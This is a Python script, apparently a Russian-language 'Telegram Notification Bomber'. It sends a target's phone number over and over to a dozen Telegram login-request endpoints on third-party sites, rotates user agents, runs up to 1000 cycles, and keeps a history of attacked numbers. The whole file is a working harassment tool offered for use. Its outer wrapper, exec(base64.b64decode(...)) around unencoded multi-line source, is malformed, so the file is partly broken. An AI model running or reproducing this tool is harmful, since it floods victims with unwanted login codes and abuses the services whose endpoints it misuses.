import base64;exec(base64.b64decode('
import os
import time
import random
import re
from datetime import datetime, timedelta

try:
    from pystyle import Colorate, Colors, Write, Center
    import requests
    import fake_useragent
except ImportError:
    print("Отсутствуют зависимости! Установите их: pip install pystyle requests fake-useragent")
    exit(1)

DEFAULT_DELAY = (0.7, 1.5)
MAX_RETRIES = 3
COOLDOWN_MINUTES = 10
SESSION = requests.Session()

ATTACK_HISTORY = []
LAST_USAGE_TIME = None

TG_ENDPOINTS = [
    "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F",
    "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
    "https://translations.telegram.org/auth/request",
    "https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
    "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
    "https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
    "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23",
    "https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin",
    "https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F",
    "https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch",
    "https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin",
    "https://oauth.telegram.org/auth?bot_id=547043436&origin=https%3A%2F%2Fstartpack.ru&embed=1&request_access=write&return_to=https%3A%2F%2Fstartpack.ru%2Fwidgets%2Flogin",
    "https://my.telegram.org/auth/send_password",
]


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def create_gradient(text, start_rgb=(255, 140, 0), end_rgb=(148, 0, 211)):
    lines, result = text.splitlines(), []
    for line in lines:
        colored_line = ""
        if line.strip():
            length = len(line)
            for i, char in enumerate(line):
                ratio = i / max(1, length - 1)
                r = int(start_rgb[0] * (1 - ratio) + end_rgb[0] * ratio)
                g = int(start_rgb[1] * (1 - ratio) + end_rgb[1] * ratio)
                b = int(start_rgb[2] * (1 - ratio) + end_rgb[2] * ratio)
                colored_line += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
        else:
            colored_line = line
        result.append(colored_line)
    return "\n".join(result)



def center_text(text, width):
    lines = text.splitlines()
    centered_lines = []
    for line in lines:
        visible_length = len(re.sub(r'\033\[[^m]*m', '', line))
        padding = max(0, (width - visible_length) // 2)
        centered_lines.append(' ' * padding + line)
    return '\n'.join(centered_lines)


def show_banner():
    banner_width = 65
    banner = f"""
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║               ██████╗ ██████╗ ██╗   ██╗██╗  ██╗                    ║
║               ██╔══██╗██╔══██╗██║   ██║██║  ██║                    ║
║               ██████╔╝██████╔╝██║   ██║███████║                    ║
║               ██╔══██╗██╔══██╗██║   ██║██╔══██║                    ║
║               ██████╔╝██║  ██║╚██████╔╝██║  ██║                    ║
║               ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝                    ║
║                                                                    ║
║     ███████╗██╗      ██████╗  ██████╗ ██████╗ ███████╗██████╗      ║
║     ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗     ║
║     █████╗  ██║     ██║   ██║██║   ██║██║  ██║█████╗  ██████╔╝     ║
║     ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██╗     ║
║     ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝███████╗██║  ██║     ║
║     ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝     ║
║                                                                    ║
║    [ Telegram Notification Bomber v1.3.7 ]                         ║
║    [ Автор: @FGBruh | @BruhYouTeeth ]                              ║
║    [ ESC - Выход | CTRL+C - Стоп ]                                 ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
"""
    centered_content = center_text(banner, banner_width + 10)
    return create_gradient(centered_content)


def validate_phone(phone):
    digits_only = re.sub(r'\D', '', phone)

    if len(digits_only) < 10 or len(digits_only) > 12:
        return None

    if digits_only.startswith('8') and len(digits_only) == 11:
        return '7' + digits_only[1:]
    elif digits_only.startswith('7') and len(digits_only) == 11:
        return digits_only
    elif len(digits_only) == 10:
        return '7' + digits_only
    else:
        return digits_only


def check_cooldown():
    global LAST_USAGE_TIME

    if not LAST_USAGE_TIME:
        return True

    try:
        current_time = datetime.now()
        time_diff = current_time - LAST_USAGE_TIME

        if time_diff.total_seconds() < COOLDOWN_MINUTES * 60:
            minutes_left = COOLDOWN_MINUTES - (time_diff.total_seconds() // 60)
            return int(minutes_left)

        return True
    except Exception as e:
        print(f"Ошибка проверки времени: {e}")
        return True


def update_usage_time():
    global LAST_USAGE_TIME
    LAST_USAGE_TIME = datetime.now()


def send_request(url, phone, proxy=None):
    try:
        ua = fake_useragent.UserAgent().random
    except:
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"

    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
    }

    # TODO: добавить вращение

    data = {"phone": phone}

    for attempt in range(MAX_RETRIES):
        try:
            resp = SESSION.post(
                url,
                headers=headers,
                data=data,
                timeout=5,
                proxies=proxy
            )

            if resp.status_code >= 400:
                print(f"URL {url} вернул код {resp.status_code}")

            return resp.status_code < 400

        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            break
        except Exception as e:
            print(f"Ошибка при запросе {url}: {str(e)}")
            break

    return False


def run_bomber(phone):
    cycles = 0
    success_count = 0
    start_time = time.time()
    delay_min, delay_max = DEFAULT_DELAY
    max_cycles = 1000

    print(f"\n[+] Запускаю флуд на +{phone}")
    print("[+] Для остановки нажмите Ctrl+C\n")

    try:
        while cycles < max_cycles:
            endpoints = list(TG_ENDPOINTS)
            random.shuffle(endpoints)

            batch_size = min(random.randint(3, 5), len(endpoints))
            for url in endpoints[:batch_size]:
                if send_request(url, phone):
                    success_count += 1

            cycles += 1

            if cycles % 3 == 0:
                elapsed = time.time() - start_time
                rate = success_count / elapsed if elapsed > 0 else 0
                print(f"[*] Прогресс: {success_count} сообщений отправлено ({rate:.1f}/сек)")

            time.sleep(random.uniform(delay_min, delay_max))

    except KeyboardInterrupt:
        print("\n[!] Прервано пользователем")
    except Exception as e:
        print(f"\n[!] Произошла ошибка: {str(e)}")

    elapsed = time.time() - start_time
    print(f"\n[+] Атака завершена: {success_count} сообщений за {elapsed:.1f} секунд")
    print(f"[+] Скорость: {success_count / elapsed:.1f} сообщений в секунду")

    return success_count


def save_history(phone, success_count):
    global ATTACK_HISTORY

    ATTACK_HISTORY.append({
        "phone": phone,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "success_count": success_count
    })

    if len(ATTACK_HISTORY) > 20:
        ATTACK_HISTORY = ATTACK_HISTORY[-20:]


def show_history():
    clear_screen()
    print(show_banner())

    if not ATTACK_HISTORY:
        print("\n[!] История пуста")
        input("\nНажмите Enter для возврата в меню...")
        return

    print("\n=== История атак ===\n")
    for i, entry in enumerate(ATTACK_HISTORY, 1):
        phone = entry.get("phone", "unknown")
        timestamp = entry.get("timestamp", "unknown")
        count = entry.get("success_count", 0)
        print(f"{i}. +{phone} ({timestamp}) - {count} сообщений")

    input("\nНажмите Enter для возврата в меню...")


def main_menu():
    while True:
        clear_screen()
        print(show_banner())

        cooldown_status = check_cooldown()
        if cooldown_status is not True:
            print(f"\n[!] ВНИМАНИЕ: Кулдаун активен! Осталось ждать: {cooldown_status} минут")

        print("\n=== Главное меню ===\n")
        print("1. Запустить спамер")
        print("2. История атак")
        print("3. Настройки")
        print("0. Выход")

        choice = input("\nВыберите опцию: ")

        if choice == "1":
            if cooldown_status is True:
                update_usage_time()
                start_spammer()
            else:
                print(f"\n[!] Невозможно запустить спамер. Подождите еще {cooldown_status} минут.")
                input("\nНажмите Enter чтобы вернуться...")
        elif choice == "2":
            show_history()
        elif choice == "3":
            # TODO: добавить меню настроек
            print("\n[!] В разработке")
            time.sleep(1)
        elif choice == "0":
            print("\n[+] Программа завершена.")
            break
        else:
            print("\n[!] Неверный выбор!")
            time.sleep(1)


def start_spammer():
    clear_screen()
    print(show_banner())

    print("\n=== Запуск атаки ===\n")

    while True:
        phone_input = input("Введите номер телефона (+7XXXXXXXXXX): ")

        if phone_input.lower() in ["q", "exit", "quit", "0"]:
            return

        phone = validate_phone(phone_input)

        if phone:
            break
        else:
            print("[!] Некорректный формат номера! Попробуйте снова или введите 'q' для выхода.")

    success_count = run_bomber(phone)

    save_history(phone, success_count)

    print("\nЧто дальше?")
    print("1. Запустить снова с тем же номером")
    print("2. Ввести другой номер")
    print("3. Вернуться в главное меню")

    choice = input("\nВыберите опцию: ")

    if choice == "1":
        run_bomber(phone)
    elif choice == "2":
        start_spammer()


if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n[!] Программа завершена пользователем.")
    except Exception as e:
        print(f"\n[!] Критическая ошибка: {str(e)}")
').decode('utf-8'))